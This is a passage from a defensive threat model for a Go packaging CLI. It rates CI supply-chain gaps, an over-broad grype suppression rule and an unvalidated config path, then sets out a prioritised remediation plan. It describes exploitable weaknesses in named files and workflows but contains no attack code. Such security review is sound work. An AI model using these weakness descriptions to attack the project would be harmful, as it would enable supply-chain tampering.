except those that must push. `commit-lint.yml` and the `changes` job need
`fetch-depth: 0` but not credentials.

**Residual risk:** none meaningful.

---

### CI-6 — Three actions still referenced by mutable tag; no runner egress control; no SAST/secret/vuln floor

| | |
|---|---|
| **Class** | Mutable third-party action reference (supply-chain tampering); missing CI security controls |
| **STRIDE** | Tampering |
| **Severity** | **S4 High** (tag pins) / **S3 Medium** (missing controls) |
| **Exploitability** | **E2 Hard** (requires compromising the action's repository or its tag) |
| **Owner** | Security Engineer |
| **Lenses** | Supply chain, Secure SDLC, CI/CD |

Still tag-referenced, so a tag move silently changes the code that runs:

| Reference | Locations |
|---|---|
| `actions/setup-go@v5` | `ci.yml:21,39,52`, `codeql.yml:29`, `samples.yml:62` |
| `golangci/golangci-lint-action@v9` | `ci.yml:25` |
| `github/codeql-action/upload-sarif@v4` | `scorecard.yml:45` |

These are exactly the references OpenSSF Scorecard's Pinned-Dependencies check flags
against the ≥ 8.0 target. Note `release.yml:24` already pins `setup-go` by SHA, so the
repository is internally inconsistent — further evidence this is an oversight.

Missing controls: no `step-security/harden-runner` (no egress allowlisting or
network-call audit on any job); no `govulncheck`; no `gitleaks`; no `gosec` in
`.golangci.yaml`; no OSV-Scanner.

**Status.** Three local branches already address parts of this — `security/pin-github-actions`,
`security/ci-govulncheck`, `security/ci-gitleaks`. None is pushed; push authorisation is
pending with the Board. `harden-runner` and `gosec` are not yet started.

**Phase 1 mitigation.** Land the three existing branches; add `harden-runner` in
`audit` mode first (to learn the real egress set) then `block`; enable `gosec` in
`.golangci.yaml`.

**Residual risk:** `harden-runner` in `audit` mode detects but does not prevent. Move to
`block` after one week of audit data.

---

### CI-7 — Blanket `fix-state: unknown` suppression in `.grype.yaml`

| | |
|---|---|
| **Class** | Over-broad vulnerability suppression without per-finding justification |
| **STRIDE** | Information disclosure (of the project's true risk posture), Repudiation |
| **Severity** | **S3 Medium** |
| **Exploitability** | n/a — this is a policy defect, not an attack |
| **Owner** | Security Engineer |
| **Lenses** | Supply chain, Open Design |

`.grype.yaml` contains:

```yaml
ignore:
 - fix-state: unknown
```

This suppresses **every** finding whose fix state grype cannot determine — a category,
not a decision. It is a rule-shaped blanket waiver with no CVE list, no justification, and
no expiry, and it silently removes findings from the `update --check` gate that the public
exit-code contract (`0` clean / `1` at-or-above threshold / `2` error) is supposed to
report honestly.

The invariant "CVE matching is grype's job, Nimbopacks implements no suppression of its
own" is intact — the suppression lives in `.grype.yaml`, which is correct. The problem is
the *breadth* of this particular rule, not its location.

**Phase 1 mitigation.** Replace the category rule with explicit per-CVE entries, each
carrying a `vulnerability:` id and a reason, and back each with an **OpenVEX** document
under `docs/security/vex/` giving a machine-readable `not_affected` justification. If the
unknown-fix-state noise is genuinely unmanageable, downgrade rather than drop: keep those
findings visible in the report and exclude them from the `--fail-on` gate only, with a
dated review item.

**Residual risk:** per-CVE triage is ongoing work with an SLA (critical 7 days, high 30).
That is the intended cost. **Cross-reference:** Surface 6 below names the same capability
— repository-controlled CVE suppression — as an accepted-by-design risk for every
*consumer* repository, not only this one; naming both makes the position coherent.

---

## 9. Surface 6 — `nimbopacks update` / the grype invocation path

**STRIDE: Tampering, Information disclosure.**

Added in revision 2 — pass 3 flagged this as a genuine gap: a surface that was
simply absent, which reads as "not considered" rather than "considered and accepted."

**Accepted risk, stated explicitly so it reads as a decision.** `internal/update` reads
`cfg.Update.GrypeConfig` — a `nimpack.yaml` field (`update.grype_config`,
`types.go:207`) — and passes it to `grype --config <path>` (`update.go:55`,
`grype.go:101-102`). A grype config can define `ignore` rules, and `update --check`'s exit
code is a **public contract** the charter names explicitly (`0` clean, `1` at-or-above
threshold, `2` tool error) — the contract CI pipelines gate merges on. So repository
content can steer which policy file governs the scan whose exit code gates the merge.
**This is intended design, not a defect:** `CLAUDE.md` states "CVE matching is grype's
job... Nimbopacks implements no suppression of its own... Triage goes through
`.grype.yaml`." A project must be able to triage its own CVEs, and the compensating
control is that `.grype.yaml` is reviewable source in the consumer's own repository. This
threat model is not asking to change that design.

### UPD-1 — `update.grype_config` is an unvalidated filesystem path, the one part that is *not* by design

| | |
|---|---|
| **Class** | Unvalidated config-supplied filesystem path (CWE-22), exactly parallel to CFG-1 |
| **STRIDE** | Information disclosure, Tampering |
| **Severity** | **S2 Low** |
| **Exploitability** | **E4 Easy** |
| **Owner** | Security Engineer |
| **Lenses** | Input handling, Complete Mediation |

Unlike the suppression-by-design capability above, `update.grype_config`'s path has **no
validation and no `srcDir` containment check** — the same class of defect as CFG-1's
`ca_cert_paths`, just lower severity because the worst outcome is grype reading or failing
to read an unexpected file, not exfiltration into a published image. It is strange to
harden one path field (`ca_cert_paths`) and not the other (`grype_config`) in the same
codebase, and it is free to fix alongside CFG-1 — same mitigation shape, same
`config.Validate` call site.

**Phase 1 mitigation.** Add `update.grype_config` containment (resolve + reject anything
outside `srcDir`, same helper as CFG-1 mitigation 1) to `config.Validate` (CFG-4
Mitigation A's call site).

**Residual risk:** none for this class once containment is enforced. The accepted
suppression-by-design risk above is unaffected — this only closes the path-handling gap
around it.

---

## 10. STRIDE coverage matrix

| Surface | S | T | R | I | D | E |
|---|:-:|:-:|:-:|:-:|:-:|:-:|
| 1 — Untrusted `nimpack.yaml` | — | CFG-2,3,4 | — | **CFG-1**, CFG-2 | CFG-4 | CFG-3 |
| 2 — Toolchain downloads | TCH-2 | **TCH-1**, TCH-2 | — | — | TCH-3 | **TCH-1** |
| 3 — TLS / custom CAs | TLS-1, TLS-2 | TLS-1 | — | **TLS-3** | TLS-2 | — |
| 4 — Container runner | — | RUN-1 | — | — | — | **RUN-1**, RUN-2, RUN-3 |
| 5 — GitHub Actions | **CI-1**, CI-2 | **CI-1**, CI-3, CI-4, CI-6 | CI-2, CI-4, CI-7 | CI-5, CI-7 | — | **CI-2** |
| 6 — `update` / grype | — | **UPD-1** | — | UPD-1 | — | — |

Bold = the primary category for that threat. Repudiation is thin across the product
because a local CLI has no audit log to attack; it appears only where release provenance
is at stake.

---

## 11. Prioritised remediation list

Ordered by `severity × exploitability`, then by cost to fix, **and sequenced explicitly
within each tranche per **: when a tranche is over-subscribed, the actual execution
order is otherwise chosen by whoever picks an item first, which silently overrides the
prioritisation this document just derived. If only the first N of a tranche land, the N
that land should be the N that were chosen. One branch and one PR each. Dates assume a
2026-10-23 start and the SLA in `docs/security/README.md` (critical 7 days, high 30 days).

### P0 — Start now, in this order

| Seq | Threat | Action | S×E | Owner | Due |
|---|---|---|---|---|---|
| 1 | **`tlsutil` split** | Move `MelangeEnvVars`/`ImageCACertInstallStep`/the `${{ }}` tokens to `pkg/backend/wolfi/`; keep path containment, PEM parsing, and bundle/fingerprint logic in `internal/utils/tlsutil.go` (TLS-2 mitigation 1) | n/a — architecture prerequisite | Security Engineer | **2026-10-24** |
| 2 | **CFG-4** | Call `config.Validate` from `pipeline.Build` and `update.Run` (Mitigation A); add a 1 MiB cap and a `schema_version` check. The cheapest item in the list and the precondition for items 7, 8, and 17 below — ranked by what it unblocks, not by its own score | S3·E5 | Security Engineer | **2026-10-25** |
| 3 | **CFG-1** | `srcDir` containment + mandatory PEM parsing in `LoadCACerts` (lands on the split from item 1); flip `inject_into_image` to default **false** with the `nil`-state warning (ADR-0002) | S4·E4 | Security Engineer | **2026-10-27** |
| 4 | **TCH-1** | `toolchain.lock` committed as `go:embed` at `internal/toolchain/toolchain.lock`, never CWD-resolved; mandatory SHA-256 verification before install; temp-file-then-rename; `fetchVerified` preserves the no-token-to-CDN split | S5·E4 | Security Engineer | **2026-10-28** |
| 5 | **TCH-2** | Exact asset-name allowlist keyed off the same lock; delete the substring/denylist matcher | S4·E2 | Security Engineer | **2026-10-29** |
| 6 | **CI-1** | Pin Wolfi packages by exact version in `wolfi-act`; split push and sign into separate steps | S5·E2 | Security Engineer | **2026-10-30** |
| 7 | **CI-2** | Ancestor-of-`main` guard in `release.yml` (repo side) **+ Board: tag protection ruleset on `v*`** | S5·E3 | Security Eng + **Board** | **2026-10-30** |

### P1 — Within 30 days

| # | Threat | Action | S×E | Owner | Due |
|---|---|---|---|---|---|
| 8 | **CFG-2** | `project.name` charset validation (`^[a-z0-9][a-z0-9._-]{0,62}$`) **shipped with generate-time normalisation in `cmd/nimbopacks/main.go`** — the charset alone regresses `init` → `build` | S4·E3 | Security Engineer | 2026-11-22 |
| 9 | **CFG-3** | `project.version` charset validation, replaced regex `^[0-9]+(\.[0-9]+){0,3}$`; reject `${{`; fuzz `config.Load`. **Land after item 10 (RUN-1)** — RUN-1 is a severity multiplier for this item | S3·E3 | Security Engineer | 2026-11-22 |
| 10 | **RUN-1** | Remove the silent docker fallback; require explicit `--runner docker`; make the valid `--runner` set backend-supplied, not hardcoded in `cmd/` | S4·E4 | Principal Architect + Security Engineer | 2026-11-22 |
| 11 | **TLS-1** | Remove `tls.insecure` from `nimpack.yaml` via the four-step sequence against CFG-4's `KnownFields(true)`; wire `NewTLSConfig` after removal | S3·E5 | Security Engineer | 2026-11-22 |
| 12 | **CI-6** | Land `security/pin-github-actions`, `security/ci-govulncheck`, `security/ci-gitleaks`; add `harden-runner` (audit) and `gosec` | S4·E2 | Security Engineer | 2026-11-22 |
| 13 | **TLS-3** | Move the CA bundle to the **per-build work dir** (`cache.NewBuildWorkDir`) at `0600`, never `CacheDir`'s shared root; confirm `cache clean` removes it; `.gitignore` entry; signal-safe cleanup | S3·E3 | Security Engineer | 2026-11-22 |
| 14 | **CI-3** | Charset-validate sample names; heredoc `$GITHUB_OUTPUT` write | S3·E4 | Security Engineer | 2026-11-22 |
| 15 | **CI-4** | Add `.github/CODEOWNERS`; **Board: enable required Code Owner review** | S3·E5 | Security Eng + **Board** | 2026-11-22 |
| 16 | **CI-7** | Replace the blanket `fix-state: unknown` rule with per-CVE entries + OpenVEX docs | S3·n/a | Security Engineer | 2026-11-22 |
| 17 | **UPD-1** | `update.grype_config` containment check, same helper as CFG-1 mitigation 1. Trivial to pair with item 3 (CFG-1) since it is the same mitigation shape and the same `config.Validate` call site | S2·E4 | Security Engineer | 2026-11-22 |

### P2 — Backlog, scheduled

| # | Threat | Action | S×E | Owner | Target |
|---|---|---|---|---|---|
| 18 | **TLS-2** | Append custom CAs to system roots in the sandbox (`update-ca-certificates`, emitted from `pkg/backend/wolfi/` per item 1) instead of overriding `SSL_CERT_FILE`; route toolchain downloads through `NewTLSConfig` (**after** item 11) | S3·E4 | Security Engineer | 2026-12-15 |
| 19 | **TCH-1 ph.2** | cosign keyless verification + SLSA provenance for melange/apko/grype | S5·E2 | Security Engineer | 2026-12-15 |
| 20 | **CI-5** | `persist-credentials: false` on all non-pushing checkouts | S2·E4 | Security Engineer | 2026-12-15 |
| 21 | **TCH-3** | Client timeout, tar entry cap, lower `maxBinaryBytes`; regression test locking in the existing traversal defence | S2·E2 | Security Engineer | 2026-12-15 |
| 22 | **RUN-2** | Gate the sysctl on `runner.environment == 'github-hosted'`; document the self-hosted guidance | S2·E5 | Security Engineer | 2026-12-15 |
| 23 | **RUN-3** | ADR recording why the tool image ships `bash` and why that does not apply to produced images | S2·E1 | CTO + Security Engineer | 2026-12-15 |

### Board-only items (cannot be done by an agent)

- **Tag protection ruleset on `v*`** (item 7) — requested 2026-10-23, still pending. Of
 limited value on its own: the repo-side ancestor guard in item 7 does not substitute for
 it.
- **Branch protection on `main`** — required CODEOWNERS review, required status checks,
 signed commits, linear history, no force pushes (items 7, 15) — requested 2026-10-23,
 still pending. CODEOWNERS (item 15) does nothing without "require review from Code
 Owners" enabled.
- **Push authorisation.** Resolved 2026-10-23: the Board ruled that host `gh` auth may be
 used directly, no separate bot identity is required. This threat-model PR and the three
 pending `security/*` CI branches (`pin-github-actions`, `ci-govulncheck`, `ci-gitleaks`)
 use it accordingly.

Both still-pending asks should be tracked independently of the agent-side P0/P1 work above
— Board turnaround is not on the team's schedule, and bundling them implicitly with
agent-owned items risks the Board items being forgotten once the agent-owned items close.

---

## 12. Verification gaps in this revision

Stated plainly so the next revision knows what to close:

1. **No Docker in this environment.** Nothing requiring melange, apko, a grype scan, or an
 image build could be executed. CFG-1's final hop, CFG-3's second-order expansion
 semantics, and RUN-1's actual docker-runner privilege level all rest on code reading
 plus documented upstream behaviour, not on execution. Each is flagged in place.
 **Independently reviewed in:** CFG-1's last hop is sound and stronger than
 originally rated — the only `AppendCertsFromPEM` in the tree is unreachable dead code,
 confirmed by `grep`, so the claim is not an inference. RUN-1 is correctly scoped and not
 overstated — declining to claim container escape and instead claiming only the silent
 control downgrade was the right call under this environment's constraints. CFG-3's
 second-order half (melange re-expanding a literal `${{` inside the version) remains
 genuinely unverified and is now split from its confirmed first-order half (§4) so the
 uncertainty does not spread to the stronger claim.
2. **No live testing against the public repository.** CI-3 was traced statically; opening
 a crafted PR to prove it would be unauthorised testing.
3. **melange's source was not audited.** The second-order `${{ }}` expansion rules
 (CFG-3) and the docker runner's container configuration (RUN-1) are upstream behaviour.
 A follow-up should read melange's expansion implementation directly.
4. **`internal/remote/` is unwritten** and therefore unmodelled (§1.2).
5. **No fuzzing was run.** `go test -fuzz` targets over `config.Load` and the generate-time
 name normaliser are proposed in items 8 and 9 of §11 but have not been executed.

## 13. Review and maintenance

- **Review cadence:** every minor release, and on any change to a §1.1 surface.
- **Security sign-off** is required on PRs touching `internal/toolchain`,
 `internal/utils/`, `pkg/backend`, or `.github/workflows` — enforced via CI-4 once
 CODEOWNERS and branch protection land.
- **Next revision must add:** `internal/remote/` when it exists; the registry push path;
 anything that introduces a network listener or an auth surface (which voids §1.3).
- **ADRs owned by the Principal Architect, tracked from this document :**
 ADR-0001 (backend-abstraction baseline) will cite this document for the `tlsutil`
 Wolfi leak (TLS-2) and for `--runner` as a Wolfi concept in the CLI surface (RUN-1);
 ADR-0002 will cover the `types.TLSConfig` changes (CFG-1, TLS-1, TLS-2) as one set; a
 separate short ADR covers RUN-3. The named trust principle (§2.1) and the
 `project.name` three-grammar overload (CFG-2) both carry into `docs/spec/nimpack-v1.md`
 as normative text, with `image.repository` recorded there as a known v2 gap. §4.1's
 schema-mutability window closes the day that spec lands.
